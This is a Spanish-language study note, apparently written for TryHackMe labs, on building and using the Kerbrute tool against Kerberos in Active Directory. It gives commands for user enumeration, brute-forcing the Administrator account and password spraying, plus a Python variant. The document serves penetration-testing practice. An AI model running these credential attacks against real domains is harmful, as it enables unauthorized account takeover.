**Kerbrute** es una herramienta de fuerza bruta y enumera el Protocolo de Autenticación Kerberos, comúnmente utilizada en entornos de Active Directory. Kerberos es un protocolo de red de autenticación utilizado en entornos Windows para autenticar usuarios y servicios. Kerbrute es útil para descubrir cuentas válidas y probar contraseñas comunes.

```
https://github.com/ropnop/kerbrute
```

# Requerimentos
Para poder utilizar kerbrute previamente deberemos tener instalado golang en nuestro sistema
```
sudo apt install golang
```
![[Pasted image 20240716082415.png]]

Verificamos que esta instalado
![[Pasted image 20240716082439.png]]
# Instalar Kerbrute
Primero clonamos el repositorio
```
git clone https://github.com/ropnop/kerbrute.git
```
![[Pasted image 20240716081246.png]]

Accedemos a la carpeta del repositorio y compilamos kerbrute
```
go build -o kerbrute main.go
```
![[Pasted image 20240716082917.png]]

Y ya tendriamos compilado kerbrute
![[Pasted image 20240716083016.png]]

Ahora lo añadiremos al path para que podamos ejecutarlo en cualquier directorio del sistema
![[Pasted image 20240717081814.png]]

# Enumeración usuarios
```
kerbrute userenum --dc 10.10.116.29 -d lab.enterprise.thm /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt
```
![[Pasted image 20240716085225.png]]

# Ataque de fuerza bruta
```
kerbrute bruteuser --dc 10.10.143.170 -d THM-AD passwordlist.txt Administrator
```

# Ataque de rociado de contraseñas
```
kerbrute passwordspray -d raz0rblack.thm --dc 10.10.199.105 users.txt roastpotatoes
```
![[Pasted image 20240730085023.png]]


--------
Tambien tenemos esta otra version de kerbrute de impacket escrita en python que podemos aprovechar para hacer ataques de fuerza bruta con una lista de usuarios y contraseñas
```
https://github.com/TarlogicSecurity/kerbrute
```

Descargamos el repositorio
![[Pasted image 20240717082447.png]]

Accedemos al directorio e instalamos las dependencias
![[Pasted image 20240717082601.png]]

Una vez instalado ya podremos utilizar esta version de kerbrute en python
![[Pasted image 20240717100157.png]]

Para hacer el ataque de fuerza bruta podemos ejecutar el siguiente comando
```
python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100
```
![[Pasted image 20240717102130.png]]

